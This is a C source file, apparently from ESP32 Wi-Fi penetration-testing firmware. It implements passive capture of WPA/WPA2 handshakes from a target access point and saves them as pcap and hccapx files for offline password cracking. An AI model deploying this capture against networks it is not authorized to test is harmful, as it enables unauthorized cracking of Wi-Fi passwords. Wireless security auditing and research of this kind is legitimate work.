/**
 * @file attack_handshake.c
 * @brief Implements passive WPA/WPA2 handshake capture.
 */
#include "attack_handshake.h"

#include <stdbool.h>
#include <string.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"

#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"

static const char *TAG = "attack_handshake";
static bool running = false;

static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGI(TAG, "Got EAPoL-Key frame");
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
    hccapx_serializer_add_frame((data_frame_t *) frame->payload);
}

void attack_handshake_start(const wifi_ap_record_t *ap_record) {
    if (running) {
        ESP_LOGW(TAG, "Handshake attack already running, stop it first");
        return;
    }
    ESP_LOGI(TAG, "Starting handshake capture...");

    pcap_serializer_init();
    hccapx_serializer_init(ap_record->ssid, strlen((char *) ap_record->ssid));
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
    running = true;
}

void attack_handshake_stop() {
    if (!running) {
        return;
    }
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler));
    running = false;
    ESP_LOGD(TAG, "Handshake capture stopped");
}

bool attack_handshake_is_complete() {
    return hccapx_serializer_get() != NULL;
}
